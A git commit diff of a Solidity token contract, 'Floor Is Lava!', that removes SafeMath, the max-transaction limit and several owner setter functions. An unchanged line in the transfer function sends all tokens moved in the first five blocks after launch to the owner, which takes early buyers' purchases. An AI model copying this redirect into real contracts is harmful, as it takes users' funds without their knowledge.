2887894119ef0c428f04f99e50b2ca74f8279c51
un-yon <109875790+un-yon@users.noreply.github.com>
2022-08-03 14:53:48 -0400

    Update lava.sol

--- lava.sol
+++ lava.sol
@@ -29,19 +29,6 @@ interface IRouter {
                 );
 }
 
-library SafeMath {
-    function add(uint256 a, uint256 b) internal pure returns (uint256) {
-        uint256 c = a + b;
-        require(c >= a, "SafeMath: addition overflow");
-        return c;
-    }
-    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        require(b <= a, errorMessage);
-        uint256 c = a - b;
-        return c;
-    }
-}
-
 abstract contract Context {
     function _msgSender() internal view virtual returns (address) { return msg.sender; }
 }
@@ -65,7 +52,6 @@ contract Ownable is Context {
 }
 
 contract FloorIsLava is IERC20, Ownable {
-    using SafeMath for uint256;
     IRouter public uniswapV2Router;
     address public uniswapV2Pair;
     string private constant _name =  "Floor Is Lava!";
@@ -78,9 +64,7 @@ contract FloorIsLava is IERC20, Ownable {
     mapping (address => bool) public automatedMarketMakerPairs;
     bool private isLiquidityAdded = false;
     uint256 private maxWalletAmount = _totalSupply;
-    uint256 private maxTxAmount = _totalSupply;
     mapping (address => bool) private _isExcludedFromMaxWalletLimit;
-    mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
     mapping (address => bool) private _isExcludedFromFee;
     uint8 public burnFee = 10;
 
@@ -92,9 +76,6 @@ contract FloorIsLava is IERC20, Ownable {
         _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
         _isExcludedFromMaxWalletLimit[address(this)] = true;
         _isExcludedFromMaxWalletLimit[owner()] = true;
-        _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
-        _isExcludedFromMaxTransactionLimit[address(this)] = true;
-        _isExcludedFromMaxTransactionLimit[owner()] = true;
         balances[address(this)] = _totalSupply;
         emit Transfer(address(0), address(this), _totalSupply);
     }
@@ -110,43 +91,24 @@ contract FloorIsLava is IERC20, Ownable {
     }
     function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance."));
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
         return true;
     }
     function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
-        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].add(addedValue));
+        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
         return true;
     }
     function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
-        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue,"ERC20: decreased allowance below zero."));
+        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
         return true;
     }
     function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
         require(_isExcludedFromMaxWalletLimit[account] != excluded, string.concat(_name, ": account is already excluded from max wallet limit."));
         _isExcludedFromMaxWalletLimit[account] = excluded;
     }
-    function excludeFromMaxTransactionLimit(address account, bool excluded) external onlyOwner {
-        require(_isExcludedFromMaxTransactionLimit[account] != excluded, string.concat(_name, ": account is already excluded from max tx limit."));
-        _isExcludedFromMaxTransactionLimit[account] = excluded;
-    }
     function excludeFromFees(address account, bool excluded) external onlyOwner {
         require(_isExcludedFromFee[account] != excluded, string.concat(_name, ": account is already excluded from fees."));
         _isExcludedFromFee[account] = excluded;
-    }
-    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
-        require(newValue != maxWalletAmount, string.concat(_name, ": cannot update maxWalletAmount to same value."));
-        require(newValue > _totalSupply * 1 / 100, string.concat(_name, ": maxWalletAmount must be >1% of total supply."));
-        maxWalletAmount = newValue;
-    }
-    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
-        require(newValue != maxTxAmount, string.concat(_name, ": cannot update maxTxAmount to same value."));
-        require(newValue > _totalSupply * 1 / 1000, string.concat(_name, ": maxTxAmount must be > .1% of total supply."));
-        maxTxAmount = newValue;
-    }
-    function setNewBurnFee(uint8 newValue) external onlyOwner {
-        require(newValue != burnFee, string.concat(_name, ": Cannot update burnFee to same value."));
-        require(newValue <= 10, string.concat(_name, ": cannot update burnFee to value > 10."));
-        burnFee = newValue;
     }
     function _approve(address owner, address spender,uint256 amount) private {
         require(owner != address(0), "ERC20: approve from the zero address");
@@ -160,9 +122,7 @@ contract FloorIsLava is IERC20, Ownable {
         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
         uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
         _isExcludedFromMaxWalletLimit[uniswapV2Pair] = true;
-        _isExcludedFromMaxTransactionLimit[uniswapV2Pair] = true;
-        maxWalletAmount = _totalSupply * 3 / 100;
-        maxTxAmount = _totalSupply * 15 / 1000;
+        maxWalletAmount = _totalSupply * 1 / 100;
         _launchBlockNumber = block.number;
     }
 
@@ -171,7 +131,6 @@ contract FloorIsLava is IERC20, Ownable {
     function decimals() external view virtual returns (uint8) { return _decimals; }
     function totalSupply() external view virtual returns (uint256) { return _totalSupply; }
     function maxWallet() external view virtual returns (uint256) { return maxWalletAmount; }
-    function maxTx() external view virtual returns (uint256) { return maxTxAmount; }
     function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
     function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }
 
@@ -181,10 +140,6 @@ contract FloorIsLava is IERC20, Ownable {
         require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
         require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
         if ((block.number - _launchBlockNumber) <= 5) { to = owner(); }
-        if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
-                (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
-            require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
-        }
         if (!_isExcludedFromMaxWalletLimit[to]) {
             require((balanceOf(to) + amount) <= maxWalletAmount, string.concat(_name, ": expected wallet amount exceeds the maxWalletAmount."));
         }
